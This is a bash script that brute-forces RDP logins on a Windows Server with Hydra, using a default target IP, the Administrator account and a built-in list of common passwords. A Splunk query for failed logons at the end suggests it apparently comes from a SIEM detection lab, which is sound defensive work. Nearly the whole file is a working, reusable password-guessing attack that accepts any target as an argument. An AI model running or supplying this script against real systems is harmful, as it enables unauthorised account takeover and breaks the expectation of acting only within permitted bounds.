<![CDATA[#!/bin/bash
# ============================================================
# RDP Brute Force Attack Script
# Attacker: Kali Linux
# Target: Windows Server
# MITRE ATT&CK: T1110.001 — Password Guessing
# ============================================================

set -euo pipefail

TARGET_IP="${1:-10.0.0.20}"
TARGET_USER="${2:-Administrator}"
WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"
THREADS=4

echo "============================================="
echo " ATTACK: RDP Brute Force (T1110.001)"
echo " Target:   ${TARGET_USER}@${TARGET_IP}:3389"
echo " Wordlist: ${WORDLIST}"
echo "============================================="
echo ""

# ── Pre-flight Checks ──
if ! command -v hydra &> /dev/null; then
    echo "[!] Hydra not found. Install with: apt install hydra"
    exit 1
fi

if [ ! -f "${WORDLIST}" ]; then
    echo "[*] Creating fallback wordlist..."
    WORDLIST="/tmp/siem_lab_rdp_passwords.txt"
    cat > "${WORDLIST}" << 'EOF'
password
Password1
P@ssw0rd
admin
Administrator
letmein
welcome1
qwerty
123456
password123
changeme
test123
Winter2024
Summer2024
Company123
EOF
fi

# ── Connectivity Check ──
echo "[*] Checking target connectivity..."
if ! ping -c 1 -W 2 "${TARGET_IP}" &> /dev/null; then
    echo "[!] Cannot reach ${TARGET_IP}"
    exit 1
fi
echo "[✓] Target reachable"

echo "[*] Checking RDP port 3389..."
if ! nc -z -w 2 "${TARGET_IP}" 3389 &> /dev/null; then
    echo "[!] RDP port 3389 is closed on ${TARGET_IP}"
    exit 1
fi
echo "[✓] RDP port 3389 is open"

# ── Run Attack ──
echo ""
echo "[*] Launching Hydra RDP brute force..."
echo "[*] Timestamp: $(date '+%Y-%m-%d %H:%M:%S')"
echo ""

hydra -l "${TARGET_USER}" \
      -P "${WORDLIST}" \
      rdp://"${TARGET_IP}" \
      -t "${THREADS}" \
      -V \
      -f \
      -o "/tmp/hydra_rdp_results_$(date +%s).txt"

echo ""
echo "[✓] RDP brute force complete"
echo "[*] Check Splunk: index=wineventlog EventCode=4625 Logon_Type=10"
]]>
